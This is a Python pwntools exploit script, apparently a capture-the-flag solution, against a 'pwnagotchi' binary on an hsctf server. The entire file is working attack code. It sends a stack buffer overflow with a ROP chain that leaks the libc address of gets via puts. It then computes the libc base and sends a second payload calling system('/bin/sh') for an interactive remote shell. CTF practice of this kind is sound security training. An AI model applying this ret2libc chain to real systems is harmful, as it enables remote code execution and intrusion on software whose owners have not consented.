
from pwn import *
import sys

r = remote('pwn.hsctf.com', 5005)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # local lib
libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')  # https://libc.blukat.me/
# r = process('./pwnagotchi')
elf = ELF('./pwnagotchi')

gets_off = libc.sym['gets']

puts = elf.plt['puts']
gets = elf.got['gets']

rdi = 0x04009f3  # pop rdi; ret;
main = 0x0400846
zzz = 0x400801
eat = 0x04007E7

p = b'A' * 20
p += p64(rdi)
p += p64(gets)
p += p64(puts)
p += p64(eat)
p += p64(zzz)
p += p64(main)

r.readline()
r.sendline(p)  # local process
w = r.recvuntil('name: \n').split()
leak = int.from_bytes(w[8], byteorder='little')  # local process

LIBC_BASE = leak - gets_off
ADDR_BINSH = next(libc.search(b'/bin/sh')) + LIBC_BASE
ADDR_SYSTEM = libc.symbols['system'] + LIBC_BASE

print()
log.info('gets address:      ' + hex(leak))
log.info('Libc base address: ' + hex(LIBC_BASE))
log.info('System address:    ' + hex(ADDR_SYSTEM))
log.info('/bin/sh address:   ' + hex(ADDR_BINSH))
print()

p = b'B' * 20
p += p64(rdi+1)
p += p64(rdi)
p += p64(ADDR_BINSH)
p += p64(ADDR_SYSTEM)

r.sendline(p)

r.interactive()
